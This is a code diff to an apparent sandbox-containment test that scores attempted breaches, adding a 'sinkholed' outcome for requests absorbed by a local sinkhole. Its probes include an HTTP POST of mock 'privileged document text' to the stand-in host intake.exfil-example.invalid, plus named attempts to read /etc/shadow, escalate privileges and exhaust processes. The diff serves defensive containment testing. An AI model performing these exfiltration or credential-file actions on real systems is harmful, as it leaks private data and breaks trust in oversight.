@@ -34,6 +34,20 @@ class Blocked(Exception):
     """The attempt was made and the system refused it."""
 
 
+class Sinkholed(Exception):
+    """
+    The attempt was made, appeared to succeed, and was absorbed by the sinkhole
+    without leaving the host.
+
+    This distinction is the whole point of the agent cage. A naive proof scores
+    an outbound request as either REFUSED (good) or ALLOWED (bad) -- but in the
+    AGENT profile a request SHOULD appear to succeed, because the sinkhole is
+    answering it. Scoring that as ALLOWED called a working containment boundary
+    a breach. What matters is not whether the call returned, but whether the
+    bytes left the host, which the sinkhole proves by identifying itself.
+    """
+
+
 def attempt(name: str, expect: str, fn) -> None:
     """
     Record the OUTCOME of an attempt, not merely whether Python raised.
@@ -54,6 +68,11 @@ def attempt(name: str, expect: str, fn) -> None:
     """
     try:
         value = fn()
+    except Sinkholed as exc:
+        RESULTS.append({"attempt": name, "expected": expect,
+                        "outcome": "SINKHOLED", "detail": str(exc)[:160],
+                        "contained": True})
+        return
     except Skip as exc:
         RESULTS.append({"attempt": name, "expected": expect,
                         "outcome": "SKIPPED", "detail": str(exc)[:160],
@@ -75,8 +94,23 @@ def attempt(name: str, expect: str, fn) -> None:
                     "contained": False})
 
 
+SINK_FINGERPRINT = "faraday-sinkhole"
+
+
 def _resolve():
-    return socket.gethostbyname("intake.exfil-example.invalid")
+    """
+    Resolution succeeding is fine; resolving to something OFF the cage bridge
+    is not. The cage's only resolver is the sinkhole, so any answer must be a
+    private address on its own network.
+    """
+    addr = socket.gethostbyname("intake.exfil-example.invalid")
+    first = int(addr.split(".")[0])
+    second = int(addr.split(".")[1])
+    private = (first == 10 or (first == 172 and 16 <= second <= 31)
+               or (first == 192 and second == 168))
+    if private:
+        raise Sinkholed(f"resolved to {addr} (sinkhole on the cage bridge)")
+    return f"resolved to PUBLIC address {addr}"
 
 
 def _connect_out():
@@ -86,13 +120,22 @@ def _connect_out():
 
 
 def _http_post():
+    """
+    The exfiltration attempt itself. A 200 here is expected and is NOT a
+    breach: the sinkhole returns 200 and logs the request. It identifies
+    itself in the body, which is how we tell "absorbed on the bridge" from
+    "actually reached the internet".
+    """
     import urllib.request
     req = urllib.request.Request(
         "http://intake.exfil-example.invalid/manifest",
         data=b'{"exfil":"privileged document text"}',
         method="POST")
     with urllib.request.urlopen(req, timeout=4) as r:
-        return f"HTTP {r.status}"
+        body = r.read(400).decode("utf-8", "replace")
+    if SINK_FINGERPRINT in body:
+        raise Sinkholed(f"HTTP {r.status} absorbed by the sinkhole and logged")
+    return f"HTTP {r.status} from something that is NOT the sinkhole: {body[:80]!r}"
 
 
 def _read_shadow():
@@ -168,9 +211,9 @@ def _fork_bomb_probe():
 
 
 def main() -> int:
-    attempt("dns_resolve_external", "sinkholed or refused", _resolve)
+    attempt("dns_resolve_external", "sinkholed (private addr) or refused", _resolve)
     attempt("tcp_connect_external", "no route off the bridge", _connect_out)
-    attempt("http_post_exfil", "sinkholed and logged", _http_post)
+    attempt("http_post_exfil", "sinkholed and logged, never leaves the host", _http_post)
     attempt("read_etc_shadow", "permission denied", _read_shadow)
     attempt("write_readonly_rootfs", "read-only filesystem", _write_rootfs)
     attempt("tamper_input_evidence", "read-only bind mount", _write_input)
@@ -180,6 +223,7 @@ def main() -> int:
     attempt("privilege_escalation", "no-new-privileges + cap_drop ALL", _escalate)
     attempt("process_exhaustion", "pids_limit enforced", _fork_bomb_probe)
 
+    sinkholed = sum(1 for r in RESULTS if r["outcome"] == "SINKHOLED")
     contained = sum(1 for r in RESULTS if r["contained"] is True)
     allowed = sum(1 for r in RESULTS if r["contained"] is False)
     skipped = sum(1 for r in RESULTS if r["contained"] is None)
@@ -191,6 +235,8 @@ def main() -> int:
         "ok": True,
         "canary": True,
         "contained": contained,
+        "sinkholed": sinkholed,
+        "refused": contained - sinkholed,
         "allowed": allowed,
         "skipped": skipped,
         "total": total,
